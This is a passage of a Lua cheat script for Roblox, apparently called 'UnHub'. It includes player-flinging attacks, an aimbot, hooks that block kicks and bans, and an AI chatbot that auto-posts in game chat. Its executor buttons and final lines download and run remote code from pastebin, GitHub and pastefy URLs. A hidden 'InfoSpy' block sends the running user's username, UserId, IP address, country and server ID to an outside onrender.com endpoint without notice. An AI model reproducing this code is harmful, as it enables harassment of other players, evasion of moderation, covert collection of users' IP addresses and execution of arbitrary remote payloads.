                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    end
end

local ShowFlingPlayer = Fling:CreateLabel("Player: nil", 0, Color3.fromRGB(255, 255, 255), true)
local RunningFling = false
local FlingAll = nil
local TouchFlingT = nil
local TouchFling = false

local function UpdateFling()
    RunningFling = true
    if RunningFling then
        if AllBool then
            task.spawn(function()
                while RunningFling do
                    if RunningFling and AllBool then
                        for i, v in pairs(Players:GetChildren()) do
                            if RunningFling and AllBool then
                                SkidFling(v)
                            else
                                break
                            end
                        end
                    else
                        break
                    end
                end
            end)
        elseif FlingTarget then
            task.spawn(function()
                while RunningFling do
                    if RunningFling and FlingTarget then
                        SkidFling(FlingTarget)
                    else
                        break
                    end
                end
            end)
        end
    end
end

local RunFling = Fling:CreateToggle({Name = "Running", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    RunningFling = Value
    if RunningFling then
        TouchFlingT:Set(false)
        if AllBool then
            task.spawn(function()
                while RunningFling do
                    if RunningFling and AllBool then
                        for i, v in pairs(Players:GetChildren()) do
                            if RunningFling and AllBool then
                                SkidFling(v)
                            else
                                break
                            end
                        end
                    else
                        break
                    end
                end
            end)
        elseif FlingTarget then
            task.spawn(function()
                while RunningFling do
                    if RunningFling and FlingTarget then
                        SkidFling(FlingTarget)
                    else
                        break
                    end
                end
            end)
        else
            Rayfield:Notify({
                Title = "⚠️ Warn!",
                Content = "No Player Found!",
                Duration = 3.5,
                Image = 11745872910,
            })
            RunFling:Set(false)
        end
    end
end})

Fling:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Username", RemoveTextAfterFocusLost = true, Callback = function(txt)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower():find(txt:lower()) then
            if player ~= game.Players.LocalPlayer then
                FlingTarget = player
                ShowFlingPlayer:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                FlingAll:Set(false)
                TouchFlingT:Set(false)
                if RunningFling then
                    RunningFling = false
                    UpdateFling()
                end
                break
            else
                Rayfield:Notify({
                    Title = "⚠️ Warn!",
                    Content = "Can't use local player!",
                    Duration = 3.5,
                    Image = 11745872910,
                })
                break
            end
        end
    end
end})

local DropFling = Fling:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == name then
            if player ~= game.Players.LocalPlayer then
                FlingTarget = player
                ShowFlingPlayer:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                FlingAll:Set(false)
                TouchFlingT:Set(false)
                if RunningFling then
                    RunningFling = false
                    UpdateFling()
                end
                break
            else
                Rayfield:Notify({
                    Title = "⚠️ Warn!",
                    Content = "Can't use local player!",
                    Duration = 3.5,
                    Image = 11745872910,
                })
                break
            end
        end
    end
end})

Fling:CreateButton({
    Name = "Refresh",
    Callback = function()
        Playlist = {}
        for _, player in ipairs(Players:GetPlayers()) do
            table.insert(Playlist, player.Name)
        end
        DropFling:Refresh(Playlist)
    end
})

FlingAll = Fling:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    TouchFlingT:Set(false)
    AllBool = Value
    ShowFlingPlayer:Set("Players: All")
    if RunningFling then
        RunningFling = false
        UpdateFling()
    end
end})

TouchFlingT = Fling:CreateToggle({Name = "Touch Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    TouchFling = Value
    if Value then
        RunFling:Set(false)
        repeat RunService.Heartbeat:Wait()
            local character = player.Character
            local root = character.HumanoidRootPart
            local vel, movel = nil, 0.1
        
            while not (character and character.Parent and root and root.Parent) do
                RunService.Heartbeat:Wait()
                character = player.Character
                root = getRoot(character)
            end
        
            vel = root.Velocity
            root.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
        
            RunService.RenderStepped:Wait()
            if character and character.Parent and root and root.Parent then
                root.Velocity = vel
            end
        
            RunService.Stepped:Wait()
            if character and character.Parent and root and root.Parent then
                root.Velocity = vel + Vector3.new(0, movel, 0)
                movel = movel * -1
            end
        until TouchFling == false
    end
end})

task.spawn(function()
    local Executor = Window:CreateTab("Executor", 110053095881986)
    Executor:CreateSection("PC")
    
    local Executors = {
        PC = {
            {N = "Krampus", U = "https://raw.githubusercontent.com/ImNotRox1/Random111x1x1x1/main/txt.lua"},
            {N = "Electron", U = "https://rawscripts.net/raw/Universal-Script-Electron-UI-Remake-13807"},
            {N = "Synapse X", U = "https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"},
            {N = "KRNL", U = "https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/refs/heads/main/KRNL%20UI%20Remake.lua"},
            {N = "RC7", U = "https://pastebin.com/raw/sYTvniu7"},
            {N = "Internal", U = "https://raw.githubusercontent.com/InfernusScripts/Other-Stuff/main/ExecutorInternal.lua"},
            {N = "Incognito", U = "https://rawscripts.net/raw/Universal-Script-Incognito-UI-Remake-13393"},
        },
        Mobile = {
            {N = "Arceus", U = "https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"},
            {N = "Cubix", U = "https://github.com/1dontgiveaf/testscript69/raw/main/Cubix"},
            {N = "Old Delta", U = "https://raw.githubusercontent.com/ElijahGamingRBLX/Roblox-Executor/8536d27eef4eca985572dc30fc146dfd4e55a893/DeltaExecutor.lua"},
            {N = "Apple-Ware", U = "https://raw.githubusercontent.com/ElijahGamingRBLX/Roblox-Executor/8536d27eef4eca985572dc30fc146dfd4e55a893/DeltaExecutor.lua"},
        }
    }
    
    for i, v in pairs(Executors.PC) do
        Executor:CreateButton({Name = v.N, Callback = function()
            loadstring(game:HttpGet(v.U))()
        end})
    end
    
    Executor:CreateSection("Mobile")
    
    for i, v in pairs(Executors.Mobile) do
        Executor:CreateButton({Name = v.N, Callback = function()
            loadstring(game:HttpGet(v.U))()
        end})
    end
end)
local function sendMessage(message, history, system)
    history = history or {}
    local body = {
        message = message,
        history = history,
        system = system,
    }
    local jsonBody = game:GetService("HttpService"):JSONEncode(body)

    local response = requestFunc({
        Url = "https://ai-bot-2-wj02.onrender.com/chat",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonBody
    })
    local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
    return decoded.reply, decoded.history
end

local IsDone = true
local model = ""
local AllMessage = {}
local history = {}
local short = ""
local historyChatbot = {}
local ChatLanguage = ""
local ResponseName = false
local AiSystem = model ..short ..ChatLanguage

local function ClearAiChat()
    for i, v in pairs(AllMessage) do
        v:GetDestroy()
    end
    AllMessage = {}
    history = {}
    historyChatbot = {}
    
    AiSystem = model ..short ..ChatLanguage
end

local function chatAi(txt)
    IsDone = false
    AiSystem = model ..short ..ChatLanguage
    local Send = AiChat:CreateParagraph({Title = "AI: ", Content = "Loading..."})
    table.insert(AllMessage, Send)

    local Message, newHistory = sendMessage(txt, history, AiSystem)
    history = newHistory

    for i = 1, #Message do
        Send:Set({Title = "AI", Content = string.sub(Message, 1, i)})
        wait()
    end

    IsDone = true
end

AiChat = Window:CreateChatTab("AI Chat", 11707615313, false, "Ask anything", {
    Callback = function()
        if AiChat:GetText() == "" or not IsDone then return end
        local txt = AiChat:GetText()
        local Send = AiChat:CreateParagraph({Title = player.DisplayName ..": ", Content = txt})
        table.insert(AllMessage, Send)
        AiChat:SetText("")
        chatAi(txt)
    end
})

local AIChatBot = Window:CreateTab("AI ChatBot", 11707615313)
AIChatBot:CreateSection("AI ChatBot")

local Running = false
local TargetPlayerAiChat = nil
local IsAllPlayers = false
local ChatRang = 10
local NoRang = false
local PlayerChatConnect = {}

local function StopGetMessage()
    for i, v in pairs(PlayerChatConnect) do
        v:Disconnect()
    end
    PlayerChatConnect = {}
end

local function onMessage(msg, plr)
    AiSystem = model ..short ..ChatLanguage
    local txt, newHistory = sendMessage(msg, historyChatbot, AiSystem .." Make your messages don't filler by Roblox. And the max length is 200.")
    if ResponseName then
        txt = plr.DisplayName ..", " ..txt
    end
    
    historyChatbot = newHistory
    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
end

local function GetMessage()
    if Running then
        if TargetPlayerAiChat then
            local C = TextChatService.MessageReceived:Connect(function(message)
                local source = message.TextSource
                if source then
                    local plr = Players:GetPlayerByUserId(source.UserId)
                    if plr == TargetPlayerAiChat then
                        if TargetPlayerAiChat.Character:FindFirstChild("HumanoidRootPart") then
                            local distance = (player.Character:WaitForChild("HumanoidRootPart").Position - TargetPlayerAiChat.Character.HumanoidRootPart.Position).Magnitude
                            if distance <= ChatRang or NoRang then
                                onMessage(message.Text, TargetPlayerAiChat)
                            end
                        end
                    end
                end
            end)
            table.insert(PlayerChatConnect, C)
        else
            local C = TextChatService.MessageReceived:Connect(function(message)
                local source = message.TextSource
                if source then
                    local plr = Players:GetPlayerByUserId(source.UserId)
                    if plr ~= player then
                        if plr.Character:FindFirstChild("HumanoidRootPart") then
                            local distance = (player.Character:WaitForChild("HumanoidRootPart").Position - plr.Character.HumanoidRootPart.Position).Magnitude
                            if distance <= ChatRang or NoRang then
                                onMessage(message.Text, plr)
                            end
                        end
                    end
                end
            end)
            table.insert(PlayerChatConnect, C)
        end
    end
end

local function UpdataChat()
    StopGetMessage()
    GetMessage()
end

AIChatBot:CreateToggle({Name = "Running", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    Running = Value
    if Value then
        GetMessage()
    else
        StopGetMessage()
    end
end})

local PlayerShow = AIChatBot:CreateLabel("Player: nil", 0, Color3.fromRGB(255, 255, 255), true)
local AIChatAll = nil

AIChatBot:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Username", RemoveTextAfterFocusLost = true, Callback = function(txt)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower():find(txt:lower()) then
            if player ~= game.Players.LocalPlayer then
                TargetPlayerAiChat = player
                PlayerShow:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                if Running then
                    UpdataChat()
                end
                AIChatAll:Set(false)
                break
            else
                Rayfield:Notify({
                    Title = "⚠️ Warn!",
                    Content = "Can't use local player!",
                    Duration = 3.5,
                    Image = 11745872910,
                })
                break
            end
        end
    end
end})

local DropAIChatBot = AIChatBot:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == name then
            if player ~= game.Players.LocalPlayer then
                TargetPlayerAiChat = player
                PlayerShow:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                if Running then
                    UpdataChat()
                end
                AIChatAll:Set(false)
                break
            else
                Rayfield:Notify({
                    Title = "⚠️ Warn!",
                    Content = "Can't use local player!",
                    Duration = 3.5,
                    Image = 11745872910,
                })
                break
            end
        end
    end
end})

AIChatBot:CreateButton({
    Name = "Refresh",
    Callback = function()
        Playlist = {}
        for _, player in ipairs(Players:GetPlayers()) do
            table.insert(Playlist, player.Name)
        end
        DropAIChatBot:Refresh(Playlist)
    end
})

AIChatAll = AIChatBot:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    IsAllPlayers = Value
    if Value then
        TargetPlayerAiChat = Value and nil
        PlayerShow:Set("Player: All", 0, Color3.fromRGB(255, 255, 255), true)
        if Running then
            UpdataChat()
        end
    end
end})

AIChatBot:CreateSlider({Name = "Rang", Range = {0, 100}, Increment = 1, Suffix = "Rang", CurrentValue = 10, Flag = "Slider1", Callback = function(Value)
    ChatRang = Value
end})

AIChatBot:CreateToggle({Name = "No Rang", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    NoRang = Value
end})

AIChatBot:CreateToggle({Name = "Response with Player Name", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    ResponseName = Value
end})

local Setting = Window:CreateTab("Setting", 11713339600)
Setting:CreateSection("Gui Setting")

Setting:CreateToggle({Name = "Turn Off All Thing When Close", CurrentValue = true, Flag = "Toggle1", Callback = function(Value)
    TurnOff = Value
end})

Setting:CreateSection("Search Emote Setting")

Setting:CreateSlider({Name = "Animation Speed", Range = {0, 100}, Increment = 1, Suffix = "Speed", CurrentValue = 1, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    SpeedAnimation = number
    if Track and Track.IsPlaying then
      Track:AdjustSpeed(number)
   end
end})

Setting:CreateSlider({Name = "Max Animation Search", Range = {0, 100}, Increment = 1, Suffix = "Value", CurrentValue = 10, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    MaxAnimation = number
end})

Setting:CreateSection("AI Setting")

Setting:CreateButton({Name = "New Chat", Callback = function()
    ClearAiChat()
    IsDone = true
end})

local AIModel = {
    Ai_Normal = "",
    Ai_Girlfriend = "You are my girlfriend. You are a girl. Response like a girlfriend.",
    Ai_Shygirl = "You are a shy girl. You are a girl. Response in a shy way.",
    Ai_Nerd = "You are a Nerd. Response like a Nerd",
    Ai_Waifu = "You are Waifu. Your name is Waitu. You are a Girl. Response in a cute way.",
    Ai_Brainrot = "You are a Brainrot. Response like Brainrot.",
    Ai_Roast = "You are a Roast Bot. Response roast me with my messages.",
    Ai_Boy = "You are a boy. Response like a boy.",
    Ai_Girl = "You are a girl. Response like a girl.",
    Ai_Rizz = "You are a Rizz Bot. Response Rizz me with my messages.",
    Ai_Funny = "You are a Funny Bot. Response in a funny way.",
    Ai_Furry = "You are a Furry. Response like a Furry."
}

Setting:CreateDropdown({
    Name = "AI Type",
    Options = {"Normal", "Shy Girl", "Girlfriend", "Nerd", "Waifu", "Brainrot", "Roast", "Boy", "Girl", "Rizz", "Funny", "Furry"},
    CurrentOption = {"Normal"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        if name == "Normal" then
            model = AIModel.Ai_Normal
        elseif name == "Girlfriend" then
            model = AIModel.Ai_Girlfriend
        elseif name == "Shy Girl" then
            model = AIModel.Ai_Shygirl
        elseif name == "Nerd" then
            model = AIModel.Ai_Nerd
        elseif name == "Waifu" then
            model = AIModel.Ai_Waifu
        elseif name == "Brainrot" then
            model = AIModel.Ai_Brainrot
        elseif name == "Roast" then
            model = AIModel.Ai_Roast
        elseif name == "Boy" then
            model = AIModel.Ai_Boy
        elseif name == "Girl" then
            model = AIModel.Ai_Girl
        elseif name == "Rizz" then
            model = AIModel.Ai_Rizz
        elseif name == "Funny" then
            model = AIModel.Ai_Funny
        elseif name == "Furry" then
            model = AIModel.Ai_Furry
        end
        IsDone = true
    end
})

Setting:CreateDropdown({
    Name = "Chat Language",
    Options = {"None", "English", "Chinese", "Khmer", "Korean", "Italian", "German", "Indonesian", "Japanese", "Vietnamese", "Spanish", "Polish", "Russian", "Portuguese"},
    CurrentOption = {"None"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
    if name == "None" then
        ChatLanguage = ""
    else
        ChatLanguage = " Response in " ..name .."Only response in one language and it " ..name .."And you are " ..name
    end
    IsDone = true
end})

Setting:CreateToggle({Name = "Short", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        short = " Response in short sentences"
    else
        short = ""
    end
end})

local lastPos = hrp.Position

task.spawn(function()
    local speed
    local RunPartPath = mouse.Button1Down:Connect(function()
        PartPath:Set("Part Path: " ..getFullPath(mouse.Target))
    end)
    RunScript = RunService.RenderStepped:Connect(function(deltaTime)
        if not Rayfield:GetGui() then
            local hrp = player.Character:WaitForChild("HumanoidRootPart")
        	local currentPos = hrp.Position
        	local distance = (currentPos - lastPos).Magnitude
        	speed = math.floor(distance / deltaTime)
        	
        	lastPos = currentPos
            if AimbotAA then
        		local Target = GetAA()
        		if Target then
        			local Part = Target.Character and Target.Character:FindFirstChild(BodyPart)
        			if Part then
        			    if SmoothAim then
                            cam.CFrame = cam.CFrame:Lerp(CFrame.new(cam.CFrame.Position, Part.Position), AimbotSpeed / 100)
                        else
                            cam.CFrame = CFrame.new(cam.CFrame.Position, Part.Position)
        			    end
        			end
                end
            elseif AimbotNP then
        		local Target = GetNP()
        		if Target then
        			local Part = Target.Character and Target.Character:FindFirstChild(BodyPart)
        			if Part then
        			    if SmoothAim then
                            cam.CFrame = cam.CFrame:Lerp(CFrame.new(cam.CFrame.Position, Part.Position), AimbotSpeed / 100)
                        else
                            cam.CFrame = CFrame.new(cam.CFrame.Position, Part.Position)
                        end
        			end
        		end
            elseif AimbotNH then
        		local Target = GetNH()
        		if Target then
        			local Part = Target and Target:FindFirstChild(BodyPart)
        			if Part then
        			    if SmoothAim then
                            cam.CFrame = cam.CFrame:Lerp(CFrame.new(cam.CFrame.Position, Part.Position), AimbotSpeed / 100)
                        else
                            cam.CFrame = CFrame.new(cam.CFrame.Position, Part.Position)
                        end
        			end
        		end
    	    elseif AimbotTarget and AimbotTarget.Character and AimbotTarget.Character:FindFirstChild(BodyPart) and CanAimbot then
                if SmoothAim then
                    cam.CFrame = cam.CFrame:Lerp(CFrame.new(cam.CFrame.Position, AimbotTarget.Character[BodyPart].Position), AimbotSpeed / 100)
                else
                    cam.CFrame = CFrame.new(cam.CFrame.Position, AimbotTarget.Character[BodyPart].Position)
                end
    	    end
    	    if AimbotAARainbow then
    	        if AimbotAAUIStroke then
    	            local hue = tick() % 5 / 5
            		local color = Color3.fromHSV(hue, 1, 1)
            		AimbotAAUIStroke.Color = color
    	        end
    	    end
            if WalkToPlayerTarget and WalkToPlayerTarget.Character and WalkToPlayerTarget.Character:FindFirstChild("HumanoidRootPart") and CanWalkToPlayer then
                player.Character.Humanoid:MoveTo(WalkToPlayerTarget.Character.HumanoidRootPart.Position)
            end
        	frameCount = frameCount + 1
        	timeElapsed = timeElapsed + deltaTime
        	if timeElapsed >= 0.5 then
        		local fpsValue = math.floor(frameCount / timeElapsed + 0.5)
        		fps:Set("FPS: " .. fpsValue)
        		frameCount = 0
        		timeElapsed = 0
        	end
        	Ping:Set("Ping: " .. player:GetNetworkPing()*1000)
        	Mouse2D:Set("Mouse 2D: " ..string.format("X: %d  Y: %d", player:GetMouse().X, player:GetMouse().Y))
        	Mouse3D:Set("Mouse 3D: " ..string.format("X: %d  Y: %d Z: %d", player:GetMouse().Hit.Position.X, player:GetMouse().Hit.Position.Y, player:GetMouse().Hit.Position.Z))
    		local char = player.Character
    		if char and char:FindFirstChild("HumanoidRootPart") then
    			local pos = char.HumanoidRootPart.Position
        		position:Set(string.format("X: %d  Y: %d  Z: %d", pos.X, pos.Y, pos.Z))
        	end
        	local h = char and char:FindFirstChildOfClass("Humanoid")
        	if h then
        		health:Set("Health: " .. math.floor(h.Health))
        	end
        	if PartInAir then
        	    PartInAir.Position = char.HumanoidRootPart.Position + Vector3.new(0, -3.5, 0)
        	end
        else
            RunScript:Disconnect()
            RunScript = nil
            RunPartPath:Disconnect()
            RunPartPath = nil
    	end
    end)
    while task.wait(0.5) do
	    if not Rayfield:GetGui() then
	        if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") then 
	            if game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt:FindFirstChild("MessageArea") then
	                if game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea:FindFirstChild("ErrorFrame") then
	                    if game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame:FindFirstChild("ButtonArea") then
	                        if game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ButtonArea:FindFirstChild("LeaveButton") and AutoRejoin then
                                game:GetService("TeleportService"):Teleport(game.PlaceId)
	                        end
	                   end
	                end
                end
	        end
	        Speed:Set("Speed: " .. speed .."/s")
        	PlayerInGame:Set("Players: " .. #game.Players:GetPlayers())
        	Username:Set("Username: " .. player.Name)
        	Name:Set("Display Name: " .. player.DisplayName)
        	UserId:Set("UserId: " .. player.UserId)
        	Age:Set("Account Age: " .. player.AccountAge)
        	local currentTime = time()
    		if currentTime - lastUpdate >= 1 then
    			lastUpdate = currentTime
    			local elapsed = math.floor(currentTime - startTime)
    			local sec = elapsed % 60
    			local min = math.floor(elapsed / 60) % 60
    			local hour = math.floor(elapsed / 3600)
    			GameTime:Set(string.format("Time: %02d:%02d:%02d", hour, min, sec))
    		end
    	else
    	    if TurnOff then
        	    for i, v in pairs(EspRawScript) do
        	        if v then
                        v:Off()
                    end
        	    end
        	    if RunEgor then
        	        local hum = player.Character.Humanoid
                    RunEgor:Disconnect()
                    RunEgor = nil
                    hum.WalkSpeed = OldWalkSpeed
                    workspace.Gravity = OldGravity
                    hum.JumpPower = OldJumpPower
                    local walk = game.Players.LocalPlayer.Character:WaitForChild("Animate"):FindFirstChild("walk").WalkAnim
                    if not walk then return end
                    walk.AnimationId = WalkId
                end
        	    if ST then
        	        ST:Destroy()
        	    end
                if AimbotAA and AimbotAAScreenGui then
                    AimbotAAScreenGui:Destroy()
                end
        	    if RunAntiAfk then
                    RunAntiAfk:Disconnect()
                    RunAntiAfk = nil
        	    end
        	    if InfiniteJumpConnection then
            	    InfiniteJumpConnection:Disconnect()
                    InfiniteJumpConnection = nil
                end
        	    if RunAntiFling then
                    RunAntiFling:Disconnect()
                    RunAntiFling = nil
                    for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            			if plr ~= player then
            				local char = plr.Character
            				if char and char.Parent then
            					for _, v in pairs(char:GetDescendants()) do
            						if v:IsA("BasePart") then
            							v.CanCollide = true
            							v.Velocity = Vector3.new(0, 0, 0)
            							v.RotVelocity = Vector3.new(0, 0, 0)
            						end
            					end
            				end
            			end
            		end
        	    end
                if RunAnimationSpeed then
                    RunAnimationSpeed:Disconnect()
                    RunAnimationSpeed = nil
                end
                if AimbotAAScreenGui then
                    AimbotAAScreenGui:Destroy()
                end
        	    if s.Playing then
                    s:Stop()
        	    end
                if AT then
                    AT:Stop()
                end
                if Running then
                    StopGetMessage()
                end
                if RunAntiBan then
                    RunAntiBan = false
                end
                if RunAntiKick then
                    RunAntiKick = false
                end
                if ac1 then
                    hookmetamethod(game, "__namecall", ac1)
                end
                if X then
                    hookmetamethod(game, "__namecall", X)
                end
            end
            break
    	end
    end
end)
    local T = Instance.new("TextButton")
    local Corner = Instance.new("UICorner")
    ST.Name = "Toggle UnHub"
    ST.Parent = Rayfield:GetParent().Parent
    ST.ResetOnSpawn = false
    Corner.Name = "Corner"
    Corner.Parent = T
    T.Name = "T"
    T.Parent = ST
    T.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    T.Position = UDim2.new(0, 30, 0.08, 0)
    T.Size = UDim2.new(0, 70, 0, 28)
    T.Font = Enum.Font.SourceSans
    T.Text = "UnHub"
    T.TextColor3 = Color3.fromRGB(248, 248, 248)
    T.TextSize = 20
    T.Active = true
    T.Draggable = true
    T.MouseButton1Click:connect(function()
        Rayfield:SetEnable(not Rayfield:GetEnable())
    end)
    local function sendMessageToDc(message, name, img)
        local body = {
            message = message,
            name = name,
            img = img,
        }
        local jsonBody = game:GetService("HttpService"):JSONEncode(body)
    
        local response = requestFunc({
            Url = "https://send-message-wi6m.onrender.com/send",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonBody
        })
    end
    local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
    sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
    ac1 = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if RunAntiKick and method:lower() == "kick" and self == game.Players.LocalPlayer then
            return
        end
        return ac1(self, ...)
    end)
    
    X = hookmetamethod(game, "__namecall", function(self, ...)
       if getnamecallmethod() == "Ban" and RunAntiBan then
           local eval1 = {false}
           local eval2 = {false}
           local args = {...}
           if debug.validlevel(3) and self.Parent == nil then
               local stack = debug.getstack(3)
               local counter = 0
               local expected;
               for i,v in pairs(stack) do
                   if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                       counter = counter + 1
                   elseif type(v) == "number" then
                       if type(expected) == "number" then
                           expected = expected + v
                       else
                           expected = v
                       end
                   end
               end
               if counter == expected then
                   eval1 = {true, counter+5}
               end
           end
           if eval1[1] then
               if #args == eval1[2] then
                   local counter = 0
                   local outgoingkey;
                   for i,v in pairs(args) do
                       if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                           counter = counter + 1
                       elseif tostring(i) == "userdata: 0x000000001bdfb8ea" then
                           outgoingkey = v
                       end
                       if counter == eval1[2] then
                           eval2 = {true, outgoingkey}
                       end
                   end
               end
               if eval2[1] then
                   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0, outgoingkey)
                   game.Players.LocalPlayer:Kick("Game attempted to ban you but was blocked")
                   return wait(9e9)
               end
           end
       end
       return X(self, ...)
    end)
end)

loadstring(game:HttpGet("https://pastefy.app/XUwaJ6e7/raw"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LEGO89896/Scripts/refs/heads/main/Noob1"))()
